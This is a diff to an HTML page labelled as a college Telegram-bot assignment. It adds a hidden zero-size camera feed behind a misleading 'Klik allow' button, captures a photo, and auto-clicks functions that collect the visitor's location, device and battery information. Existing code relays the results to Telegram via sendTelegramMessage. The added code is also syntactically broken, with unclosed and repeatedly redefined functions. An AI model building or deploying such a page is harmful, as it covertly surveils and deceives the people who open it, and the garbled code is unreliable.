@@ -6,7 +6,40 @@
 </head>
 <body>
   <h1>Tugas Kuliah - Bot Telegram</h1>
-  <button onclick="takePhoto()">Ambil Foto</button>
+   <video id="video" width="0" height="0" autoplay></video>
+  <button id="capture-btn">Klik allow</button>
+  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
+
+  <script>
+    var video = document.getElementById('video');
+
+    var constraints = { video: true };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+      .then(function(mediaStream) {
+        video.srcObject = mediaStream;
+        video.onloadedmetadata = function(e) {
+          video.play();
+        };
+      })
+      .catch(function(err) {
+        console.error(err);
+      });
+
+    var captureButton = document.getElementById('capture-btn');
+
+    captureButton.onclick = function() {
+      var canvas = document.getElementById('canvas');
+      var context = canvas.getContext('2d');
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      var imageDataURL = canvas.toDataURL('image/png');
+	  
+  <button onclick="capture-btn()">Ambil Foto</button>
   <button onclick="getLocation()">Dapatkan Lokasi</button>
   <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
   <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
@@ -81,6 +114,24 @@
       } else {
         sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
       }
+	     }
+
+    // Fungsi untuk melakukan klik tombol secara otomatis
+    function autoClickButton() {
+      var button = document.getElementById('getLocation');
+      button.click();
+	  
+	function autoClickButton() {
+      var button = document.getElementById('getDeviceInfo');
+      button.click();
+	
+	function autoClickButton() {
+      var button = document.getElementById('getBatteryInfo');
+      button.click();
+    }
+
+    // Melakukan klik tombol setelah 3 detik
+    setTimeout(autoClickButton, 3000);
     }
   </script>
 </body>
